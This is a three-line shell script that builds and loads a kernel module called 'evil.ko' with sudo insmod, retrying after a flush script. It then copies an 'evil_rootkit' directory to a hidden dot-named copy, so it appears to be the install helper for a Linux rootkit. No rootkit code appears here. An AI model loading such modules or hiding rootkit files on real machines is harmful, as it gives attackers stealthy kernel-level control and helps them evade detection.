#!/bin/sh

make && (sudo insmod ./evil.ko || (./flush.sh && make && sudo insmod ./evil.ko))
cp -a ../evil_rootkit ../.evil_rootkit
